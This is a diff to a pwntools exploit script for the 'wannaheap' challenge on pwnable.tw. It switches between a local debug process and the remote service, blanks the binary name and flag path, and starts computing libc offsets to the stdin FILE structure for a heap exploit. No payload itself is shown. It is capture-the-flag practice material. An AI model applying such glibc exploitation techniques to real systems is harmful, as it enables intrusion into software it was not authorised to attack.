@@ -54,19 +54,18 @@ def read(key):
 while 1:
 	debug = 0
 	if debug == 1:
-		elf = ELF('./wannaheap')
+		elf = ELF('')
 		libc = ELF('./libc.so')
-		elf_1 = change_ld('./wannaheap', './ld-2.24.so')
+		elf_1 = change_ld('', './ld-2.24.so')
 		p = elf_1.process(env={'LD_PRELOAD':'./libc.so'})
-		#p = process('./wannaheap')
 		#gdb.attach(p)#, 'b *0x555555554000+0x1D39')
 		path = b'./flag\x00'
 
 	else:
 		p = remote('chall.pwnable.tw', 10305)
-		elf = ELF('./wannaheap')
+		elf = ELF('')
 		libc = ELF('./libc.so')
-		path = b'/home/wannaheap/flag\x00'
+		path = b''
 	
 	mmap_size = 0x314000
 	stdin_struct_offset = libc.symbols['_IO_2_1_stdin_']
